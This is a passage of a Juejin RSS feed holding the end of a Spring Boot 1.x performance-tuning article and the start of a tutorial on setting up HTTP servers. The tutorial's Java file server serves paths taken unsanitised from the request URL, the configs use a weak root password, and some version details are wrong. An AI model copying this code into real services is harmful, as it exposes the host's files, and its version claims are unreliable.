<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-properties" lang="properties"># application.properties（Spring Boot 1.x 配置）
# 注意：1.x 版本使用 endpoints.prometheus.enabled，不是 management.metrics.export.prometheus.enabled
endpoints.prometheus.enabled=true
</code></pre>
<p>访问 <code>http://localhost:8080/prometheus</code> 可以看到 Prometheus 格式的指标（<strong>注意：1.x 版本路径是 <code>/prometheus</code>，不是 <code>/actuator/prometheus</code></strong>）。</p>
<p><strong>监控指标示例：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 接口响应时间</span>
http_server_requests_seconds_sum{<span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>,uri=<span class="hljs-string">"/api/order/query"</span>} <span class="hljs-number">175.5</span>
http_server_requests_seconds_count{<span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span>,uri=<span class="hljs-string">"/api/order/query"</span>} <span class="hljs-number">1000</span>

<span class="hljs-comment"># JVM 内存使用</span>
jvm_memory_used_bytes{<span class="hljs-attr">area</span>=<span class="hljs-string">"heap"</span>} <span class="hljs-number">1200000000</span>
jvm_memory_max_bytes{<span class="hljs-attr">area</span>=<span class="hljs-string">"heap"</span>} <span class="hljs-number">2000000000</span>

<span class="hljs-comment"># GC 统计</span>
jvm_gc_pause_seconds_sum{<span class="hljs-attr">action</span>=<span class="hljs-string">"end_of_minor_gc"</span>} <span class="hljs-number">2.5</span>
jvm_gc_pause_seconds_count{<span class="hljs-attr">action</span>=<span class="hljs-string">"end_of_minor_gc"</span>} <span class="hljs-number">20</span>
</code></pre>
<p><strong>Grafana Dashboard 配置步骤：</strong></p>
<ol>
<li>
<p><strong>添加 Prometheus 数据源：</strong></p>
<ul>
<li>URL: <code>http://localhost:9090</code>（Prometheus 服务地址）</li>
</ul>
</li>
<li>
<p><strong>创建 Dashboard，添加关键指标：</strong></p>
<ul>
<li><strong>接口响应时间：</strong> <code>rate(http_server_requests_seconds_sum{uri="/api/order/query"}[5m])</code></li>
<li><strong>QPS：</strong> <code>rate(http_server_requests_seconds_count{uri="/api/order/query"}[5m])</code></li>
<li><strong>JVM 堆内存使用率：</strong> <code>jvm_memory_used_bytes{area="heap"} / jvm_memory_max_bytes{area="heap"} * 100</code></li>
<li><strong>GC 频率：</strong> <code>rate(jvm_gc_pause_seconds_count[5m])</code></li>
</ul>
</li>
<li>
<p><strong>设置告警规则：</strong></p>
<ul>
<li>响应时间 &gt; 500ms 时告警</li>
<li>错误率 &gt; 1% 时告警</li>
</ul>
</li>
</ol>
<p><strong>如何实时监控优化后的性能：</strong></p>
<ul>
<li>在 Grafana 中查看接口响应时间曲线，应该稳定在 150-200ms 之间</li>
<li>观察 QPS 曲线，应该稳定在 1000 左右</li>
<li>检查 GC 频率和耗时，应该明显降低</li>
</ul>
<hr/>
<h3 data-id="heading-41">五、调优风险控制：回滚与灰度策略</h3>
<h4 data-id="heading-42">5.1 SQL 索引优化回滚方案</h4>
<p><strong>风险：</strong> 添加索引可能影响写入性能，或索引创建失败导致表锁</p>
<p><strong>回滚方案：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 添加索引前备份表结构</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> order_item_backup <span class="hljs-keyword">AS</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> order_item <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>;

<span class="hljs-comment">-- 如果优化失败，执行回滚</span>
<span class="hljs-keyword">DROP</span> INDEX idx_order_item_order_id <span class="hljs-keyword">ON</span> order_item;
</code></pre>
<p><strong>灰度策略：</strong></p>
<ul>
<li>先在测试环境验证索引效果</li>
<li>生产环境在业务低峰期（如凌晨 2-4 点）执行索引创建</li>
<li>监控索引创建期间的数据库性能，如有异常立即回滚</li>
</ul>
<h4 data-id="heading-43">5.2 缓存优化回滚方案</h4>
<p><strong>风险：</strong> 缓存配置错误导致数据不一致，或缓存穿透导致数据库压力增大</p>
<p><strong>回滚方案：</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 临时关闭缓存：注释掉缓存相关代码，恢复数据库查询模式</span>
<span class="hljs-comment">// @Cacheable(value = "order", key = "#orderNo")  // 临时注释</span>
<span class="hljs-keyword">public</span> OrderVO <span class="hljs-title function_">queryOrder</span><span class="hljs-params">(String orderNo)</span> {
    <span class="hljs-comment">// 直接查询数据库，不查缓存</span>
    <span class="hljs-keyword">return</span> orderMapper.selectByOrderNo(orderNo);
}
</code></pre>
<p><strong>灰度策略：</strong></p>
<ul>
<li>生产环境调优先小流量（10%）验证 1 小时，无异常再全量发布</li>
<li>使用 Spring Cloud 的灰度发布功能，或 Nginx 的流量切分功能</li>
</ul>
<h4 data-id="heading-44">5.3 JVM 参数调优回滚方案</h4>
<p><strong>风险：</strong> JVM 参数设置不当导致 OOM 或 GC 频繁</p>
<p><strong>回滚方案：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 恢复默认 JVM 参数</span>
java -jar app.jar
<span class="hljs-comment"># 或使用备份的启动脚本</span>
./start_backup.sh
</code></pre>
<p><strong>灰度策略：</strong></p>
<ul>
<li>先在测试环境压测验证 JVM 参数效果</li>
<li>生产环境逐步调整参数（如先调整堆内存，观察 1 天后再调整 GC 参数）</li>
</ul>
<hr/>
<h3 data-id="heading-45">六、避坑指南与总结</h3>
<h4 data-id="heading-46">6.1 调优禁忌：这些坑我帮你踩过了</h4>
<h5 data-id="heading-47">禁忌 1：盲目调参</h5>
<p><strong>错误做法：</strong>
看到接口慢，直接调大 <code>max-threads</code> 到 1000，结果服务器 OOM。</p>
<p><strong>正确做法：</strong>
先诊断瓶颈，再针对性优化。比如：</p>
<ul>
<li>SQL 慢 → 优化 SQL 和索引</li>
<li>缓存未命中 → 优化缓存策略</li>
<li>线程池满 → 调整线程池参数</li>
</ul>
<h5 data-id="heading-48">禁忌 2：过度优化</h5>
<p><strong>错误做法：</strong>
为了追求极致性能，把所有数据都缓存，结果内存爆了。</p>
<p><strong>正确做法：</strong>
遵循"二八定律"：优化 20% 的关键代码，解决 80% 的性能问题。</p>
<h5 data-id="heading-49">禁忌 3：忽略业务场景</h5>
<p><strong>错误做法：</strong>
看到别人用 Redis Cluster，自己也上，结果配置复杂，维护成本高。</p>
<p><strong>正确做法：</strong>
根据业务场景选择方案：</p>
<ul>
<li>中小流量（QPS &lt; 5000）→ 单机 Redis + 本地缓存</li>
<li>大流量（QPS &gt; 10000）→ Redis Cluster + 分库分表</li>
</ul>
<h4 data-id="heading-50">6.2 经验总结：性能调优的核心原则</h4>
<p>经过这次调优，我总结出了几个核心原则：</p>
<ol>
<li>
<p><strong>先诊断，后优化</strong></p>
<ul>
<li>不要凭感觉优化，要用数据说话</li>
<li>用工具（Arthas、Actuator、慢查询日志）定位瓶颈</li>
</ul>
</li>
<li>
<p><strong>优先优化瓶颈最大的环节</strong></p>
<ul>
<li>按照"效果从易到难、成本从低到高"排序</li>
<li>SQL 优化通常见效最快，缓存优化性价比最高</li>
</ul>
</li>
<li>
<p><strong>小步快跑，持续验证</strong></p>
<ul>
<li>每次优化后都要验证效果</li>
<li>用压测工具验证，不要凭感觉</li>
</ul>
</li>
<li>
<p><strong>关注整体，不要局部优化</strong></p>
<ul>
<li>不要只优化一个接口，要关注整个系统</li>
<li>避免"按下葫芦浮起瓢"的问题</li>
</ul>
</li>
</ol>
<h4 data-id="heading-51">6.3 后续规划：还有哪些优化空间？</h4>
<p>虽然这次优化已经达到了目标（200ms 以内），但还有进一步优化的空间：</p>
<ol>
<li>
<p><strong>分库分表</strong></p>
<ul>
<li>当订单表数据量超过 1000 万时，考虑分库分表</li>
<li>Spring Boot 1.x 可以用 Sharding-JDBC 3.1.0（兼容 1.x）</li>
</ul>
</li>
<li>
<p><strong>引入消息队列削峰填谷</strong></p>
<ul>
<li>高峰期订单查询压力大，可以用 MQ 异步处理</li>
<li>Spring Boot 1.x 可以用 RabbitMQ 或 RocketMQ</li>
</ul>
</li>
<li>
<p><strong>CDN 加速静态资源</strong></p>
<ul>
<li>如果接口返回的数据包含图片等静态资源，可以用 CDN 加速</li>
</ul>
</li>
<li>
<p><strong>升级到 Spring Boot 2.x（如果允许）</strong></p>
<ul>
<li>Spring Boot 2.x 在性能上有不少优化</li>
<li>但升级需要评估成本和风险</li>
</ul>
</li>
</ol>
<h4 data-id="heading-52">6.4 进阶优化：读写分离（可选）</h4>
<p><strong>适用场景：</strong> 订单查询量远大于写入量，单库压力大</p>
<p><strong>Spring Boot 1.x 集成 Sharding-JDBC 3.1.0 实现读写分离：</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.shardingsphere<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sharding-jdbc-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-properties" lang="properties"># application.properties
# 主库（写）
sharding.jdbc.datasource.names=master,slave

sharding.jdbc.datasource.master.type=com.alibaba.druid.pool.DruidDataSource
sharding.jdbc.datasource.master.driver-class-name=com.mysql.jdbc.Driver
sharding.jdbc.datasource.master.url=jdbc:mysql://localhost:3306/order_db
sharding.jdbc.datasource.master.username=root
sharding.jdbc.datasource.master.password=123456

# 从库（读）
sharding.jdbc.datasource.slave.type=com.alibaba.druid.pool.DruidDataSource
sharding.jdbc.datasource.slave.driver-class-name=com.mysql.jdbc.Driver
sharding.jdbc.datasource.slave.url=jdbc:mysql://localhost:3307/order_db
sharding.jdbc.datasource.slave.username=root
sharding.jdbc.datasource.slave.password=123456

# 读写分离规则
sharding.jdbc.config.masterslave.name=ms
sharding.jdbc.config.masterslave.master-data-source-name=master
sharding.jdbc.config.masterslave.slave-data-source-names=slave
sharding.jdbc.config.masterslave.load-balance-algorithm-type=round_robin
</code></pre>
<p><strong>补充说明：</strong> 读写分离适合查询量远大于写入量的场景，但会增加系统复杂度，需评估维护成本。</p>
<hr/>
<h3 data-id="heading-53">写在最后</h3>
<p>这次性能调优让我深刻体会到：<strong>性能优化不是一蹴而就的，而是一个持续的过程</strong>。从 3 秒到 200 毫秒，每一步都是踩坑、排查、优化的循环。</p>
<p>如果你也在 Spring Boot 1.x 项目中遇到性能问题，希望这篇文章能给你一些启发。记住：<strong>先诊断，后优化，用数据说话，小步快跑</strong>。</p>
<p>你在 Spring Boot 1.x 调优中遇到过哪些坑？欢迎在评论区交流！</p>
<hr/>
<h3 data-id="heading-54">优化后的核心资源清单</h3>
<h4 data-id="heading-55">工具下载地址</h4>
<ul>
<li><strong>Arthas 1.3.1：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Farthas%2Freleases%2Ftag%2Farthas-all-3.8.4" target="_blank" title="https://github.com/alibaba/arthas/releases/tag/arthas-all-3.8.4" ref="nofollow noopener noreferrer">github.com/alibaba/art…</a></li>
<li><strong>JMeter 5.4.1：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Farchive.apache.org%2Fdist%2Fjmeter%2Fbinaries%2Fapache-jmeter-5.4.1.tgz" target="_blank" title="https://archive.apache.org/dist/jmeter/binaries/apache-jmeter-5.4.1.tgz" ref="nofollow noopener noreferrer">archive.apache.org/dist/jmeter…</a></li>
<li><strong>JVisualVM：</strong> JDK 8 自带，路径：<code>$JAVA_HOME/bin/jvisualvm</code></li>
</ul>
<h4 data-id="heading-56">依赖版本清单（Spring Boot 1.5.22.RELEASE 兼容）</h4>























































<table><thead><tr><th>依赖</th><th>版本</th><th>说明</th></tr></thead><tbody><tr><td>spring-boot-starter-data-redis</td><td>1.5.22.RELEASE</td><td>Redis 支持</td></tr><tr><td>mybatis-spring-boot-starter</td><td>1.3.2</td><td>MyBatis 支持</td></tr><tr><td>druid-spring-boot-starter</td><td>1.1.23</td><td>连接池</td></tr><tr><td>caffeine</td><td>2.8.8</td><td>本地缓存（高性能）</td></tr><tr><td>guava</td><td>27.1-jre</td><td>布隆过滤器（Caffeine 不提供）</td></tr><tr><td>micrometer-registry-prometheus</td><td>1.3.9</td><td>Prometheus 监控</td></tr><tr><td>commons-pool2</td><td>2.6.2</td><td>对象池</td></tr><tr><td>sharding-jdbc-spring-boot-starter</td><td>3.1.0</td><td>读写分离（可选）</td></tr><tr><td>redisson-spring-boot-starter</td><td>3.8.2</td><td>分布式锁（可选）</td></tr></tbody></table>
<h4 data-id="heading-57">相关资源</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.spring.io%2Fspring-boot%2F1.5.22.RELEASE%2Freference%2Fhtmlsingle%2F" target="_blank" title="https://docs.spring.io/spring-boot/1.5.22.RELEASE/reference/htmlsingle/" ref="nofollow noopener noreferrer">Spring Boot 1.5.x 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Farthas.aliyun.com%2Fdoc%2F" target="_blank" title="https://arthas.aliyun.com/doc/" ref="nofollow noopener noreferrer">Arthas 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.7%2Fen%2Fslow-query-log.html" target="_blank" title="https://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html" ref="nofollow noopener noreferrer">MySQL 慢查询优化指南</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fspring-projects%2Fspring-boot%2Fwiki%2FSpring-Boot-1.5-Release-Notes" target="_blank" title="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-1.5-Release-Notes" ref="nofollow noopener noreferrer">Spring Boot 1.x 升级指南</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[原来可以搭建一个HTTP服务]]></title>    <link>https://juejin.cn/post/7592960378689617955</link>    <guid>https://juejin.cn/post/7592960378689617955</guid>    <pubDate>2026-01-09T06:00:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592960378689617955" data-draft-id="7592892218669269026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="原来可以搭建一个HTTP服务"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-09T06:00:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            原来可以搭建一个HTTP服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:00:48.000Z" title="Fri Jan 09 2026 06:00:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文详细介绍从零基础到进阶的HTTP服务器搭建方法，涵盖现成软件、编程语言（Python/Node.js/Java）及工具，适用于文件共享、API开发、本地测试等场景。</p>
<hr/>
<h3 data-id="heading-0"><strong>一、快速临时 HTTP 服务（适合本地调试/文件共享）</strong></h3>
<h4 data-id="heading-1"><strong>1. Python 内置模块</strong></h4>
<ul>
<li>
<p><strong>特点</strong>：无需安装依赖，适合快速共享文件或测试 API。</p>
</li>
<li>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Python 3</span>
<span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">http.server</span> <span class="hljs-number">8000</span>  <span class="hljs-comment"># 默认目录为当前路径</span>
<span class="hljs-comment"># 或指定目录</span>
<span class="hljs-string">python</span> <span class="hljs-string">-m</span> <span class="hljs-string">http.server</span> <span class="hljs-number">8000</span> <span class="hljs-string">--directory</span> <span class="hljs-string">/path/to/files</span>
</code></pre>
</li>
<li>
<p><strong>访问</strong>：<code>http://localhost:8000</code></p>
</li>
<li>
<p><strong>适用场景</strong>：临时分享文件、前端静态页面调试。</p>
</li>
</ul>
<h4 data-id="heading-2"><strong>2. <code>http-server</code>（Node.js）</strong></h4>
<ul>
<li>
<p><strong>特点</strong>：轻量级，支持缓存控制、CORS 等基础功能。</p>
</li>
<li>
<p><strong>安装</strong>：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">npm install -g http-<span class="hljs-built_in">server</span>
</code></pre>
</li>
<li>
<p><strong>启动</strong>：</p>
<pre><code class="hljs language-r" lang="r">http<span class="hljs-operator">-</span>server <span class="hljs-operator">-</span>p <span class="hljs-number">8080</span> <span class="hljs-operator">-</span><span class="hljs-built_in">c</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>  <span class="hljs-comment"># -c-1 禁用缓存</span>
</code></pre>
</li>
<li>
<p><strong>访问</strong>：<code>http://localhost:8080</code></p>
</li>
<li>
<p><strong>适用场景</strong>：前端开发调试、快速搭建静态文件服务器。</p>
</li>
</ul>
<h4 data-id="heading-3"><strong>3. <code>rust-http-server</code>（Rust 高性能静态服务）</strong></h4>
<p><strong>核心优势</strong>：极致性能，跨平台，适合大文件/高并发的博客展示。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装（需Rust）</span>
cargo install rust-http-server

<span class="hljs-comment"># 启动</span>
http-server -p 8080 ./my-blog
</code></pre>
<h4 data-id="heading-4"><strong>4. <code>HttpServer</code>（Java）</strong></h4>
<p><strong>核心优势</strong>：🐶🐶🐶🐶</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticHttpServer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 1. 创建 HTTP 服务，监听 8080 端口</span>
        <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8080</span>), <span class="hljs-number">0</span>);
        
        <span class="hljs-comment">// 2. 配置静态文件处理器（托管当前目录下的所有文件）</span>
        server.createContext(<span class="hljs-string">"/"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StaticFileHandler</span>());
        
        <span class="hljs-comment">// 3. 启动服务</span>
        server.start();
        System.out.println(<span class="hljs-string">"HTTP 服务启动：http://localhost:8080"</span>);
    }

    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFileHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange exchange)</span> <span class="hljs-keyword">throws</span> java.io.IOException {
            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> exchange.getRequestURI().getPath();
            <span class="hljs-keyword">if</span> (path.equals(<span class="hljs-string">"/"</span>)) path = <span class="hljs-string">"/index.html"</span>;
            
            <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"."</span> + path);
            <span class="hljs-keyword">if</span> (!file.exists()) {
                exchange.sendResponseHeaders(<span class="hljs-number">404</span>, <span class="hljs-number">0</span>);
                exchange.close();
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-type">byte</span>[] content = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file).readAllBytes();
            exchange.getResponseHeaders().set(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"text/html; charset=UTF-8"</span>);
            exchange.sendResponseHeaders(<span class="hljs-number">200</span>, content.length);
            exchange.getResponseBody().write(content);
            exchange.close();
        }
    }
}
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编译（JDK8+ 直接编译）</span>
javac StaticHttpServer.java
<span class="hljs-comment"># 启动（无需任何依赖）</span>
java StaticHttpServer
</code></pre>
<hr/>
<h3 data-id="heading-5"><strong>二、生产级 HTTP 服务</strong></h3>
<h4 data-id="heading-6"><strong>1. Nginx</strong></h4>
<ul>
<li>
<p><strong>特点</strong>：高性能反向代理，支持静态文件、动态路由、负载均衡。</p>
</li>
<li>
<p><strong>安装</strong>（Ubuntu）：</p>
<pre><code class="hljs">sudo apt install nginx
</code></pre>
</li>
<li>
<p><strong>配置示例</strong>（静态博客）：</p>
<pre><code class="hljs language-ini" lang="ini">server {
    listen 80<span class="hljs-comment">;</span>
    server_name your_domain.com<span class="hljs-comment">;</span>
    root /var/www/blog<span class="hljs-comment">;</span>
    index index.html<span class="hljs-comment">;</span>

    location / {
        try_files $uri $uri/ =404<span class="hljs-comment">;</span>
    }
}
</code></pre>
</li>
<li>
<p><strong>启动</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">sudo systemctl <span class="hljs-keyword">start</span> nginx
</code></pre>
</li>
<li>
<p><strong>适用场景</strong>：生产环境静态博客、反向代理后端服务。</p>
</li>
</ul>
<h4 data-id="heading-7"><strong>2. Caddy</strong></h4>
<ul>
<li>
<p><strong>特点</strong>：自动 HTTPS 证书申请、配置简单，适合快速部署安全博客。</p>
</li>
<li>
<p><strong>安装</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载二进制文件（官网有详细步骤）</span>
wget https://caddyserver.com/api/download?os=linux&amp;<span class="hljs-built_in">arch</span>=amd64 -O caddy
<span class="hljs-built_in">chmod</span> +x caddy
</code></pre>
</li>
<li>
<p><strong>配置示例</strong>（自动 HTTPS）：</p>
<pre><code class="hljs language-bash" lang="bash">your_domain.com {
    root /var/www/blog
    file_server
    encode gzip
}
</code></pre>
</li>
<li>
<p><strong>启动</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">./caddy run --config Caddyfile
</code></pre>
</li>
<li>
<p><strong>适用场景</strong>：需要 HTTPS 的静态博客、个人网站。</p>
</li>
